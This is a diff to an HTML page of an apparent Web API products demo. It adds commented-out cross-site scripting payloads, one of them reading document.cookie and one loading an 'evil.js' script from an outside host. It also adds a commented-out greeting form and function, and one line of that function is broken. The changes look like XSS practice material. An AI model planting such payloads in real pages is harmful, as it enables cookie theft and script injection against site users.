@@ -22,7 +22,16 @@
         <ul id="productsByName" />
      
     </div>
+    <!--<img src=x onerror="alert(document.cookie);">-->
+   <!--<img src=1 onerror="s=document.createElement('script');s.src='//xss-doc.appspot.com/static/evil.js';document.body.appendChild(s);">
+    <div>
+        <h2>Name:</h2>
+        <input type="text" id="msgName" size="100" />
+        <input type="button" value="Say Hello" onclick="SayHello();" />
+        <p id="helloMessage" />
+      
 
+    </div>-->
     <script src="http://ajax.aspnetcdn.com/ajax/jQuery/jquery-2.0.3.min.js"></script>
     <script>
     var uri = 'api/products';
@@ -76,6 +85,12 @@
                 $('#productsByName').text('Error: ' + err);
             });
     }
+
+    //function SayHello() {
+    //    var name = Document.get $('#msgName').val();
+    //    $('#helloMessage').text('Hello : ' + name);
+
+    //}
     </script>
 </body>
 </html>
